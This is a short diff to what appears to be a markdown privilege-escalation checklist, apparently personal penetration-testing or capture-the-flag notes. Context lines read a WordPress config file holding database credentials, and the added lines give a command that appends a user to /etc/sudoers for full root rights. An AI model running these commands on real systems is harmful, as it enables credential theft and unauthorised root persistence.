@@ -206,6 +206,8 @@
 > 
 >  #### Wordpress
 > - [ ] cat /srv/http/wp-config.php
+>  #### Root 
+> - [ ] [[0000030|echo [user] ALL=(ALL) ALL >> /etc/sudoers]]
 
 > [!note]- SUID / Capabilities / Sudo
 >  #### FREE WINS SUID
